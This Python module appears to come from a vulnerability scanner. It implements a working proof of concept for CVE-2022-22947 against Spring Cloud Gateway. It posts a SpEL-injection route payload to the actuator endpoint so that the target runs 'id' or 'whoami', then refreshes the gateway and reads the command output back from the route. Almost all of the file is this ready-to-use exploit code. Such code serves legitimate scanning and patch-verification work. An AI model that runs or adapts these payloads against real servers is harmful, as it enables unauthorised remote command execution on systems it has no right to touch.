# coding:utf-8

import json
import aiohttp
import asyncio

from util import RandomUA
from util.Translate import tr

class CVE_2022_22947_Async:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua1 = ua.UserAgent()
        self.ua2 = ua.UserAgent()
        self.headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': self.ua1,
            'Content-Type': 'application/json'
        }

        self.headers2 = {
            'User-Agent': self.ua2,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.payload = '''{\r
                      "id": "hacktest",\r
                      "filters": [{\r
                        "name": "AddResponseHeader",\r
                        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                        }],\r
                      "uri": "http://example.com",\r
                      "order": 0\r
                    }'''

        self.payload2 = '''{\r
                      "id": "hacktest",\r
                      "filters": [{\r
                        "name": "AddResponseHeader",\r
                        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
                        }],\r
                      "uri": "http://example.com",\r
                      "order": 0\r
                    }'''

    async def fetch(self, session, url, payload, headers, proxies):
        try:
            async with session.post(url=url, data=payload, headers=headers, verify_ssl=False, proxies=proxies) as response:
                return await response.text()
        except Exception as e:
            return str(e)

    async def poc(self, url, proxies, ProxyStute):
        if ProxyStute == 1:
            proxy = proxies
        else:
            proxy = None
        try:
            async with aiohttp.ClientSession() as session:
                tasks = [
                    self.fetch(session, url + "actuator/gateway/routes/hacktest", self.payload, self.headers1, proxy),
                    self.fetch(session, url + "actuator/gateway/refresh", "", self.headers2, proxy),
                    self.fetch(session, url + "actuator/gateway/routes/hacktest", "", self.headers2, proxy),
                ]

                responses = await asyncio.gather(*tasks)

                if 'uid=' in str(responses[2]) and 'gid=' in str(responses[2]) and 'groups=' in str(responses[2]):
                    result = tr("v.22947.out_neg", url=url)
                    result1 = responses[2] + "\n"
                    return result + result1
                else:
                    result = tr("v.22947.none", url=url)
                    return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    async def exp(self, url, proxies, ProxyStute):
        pass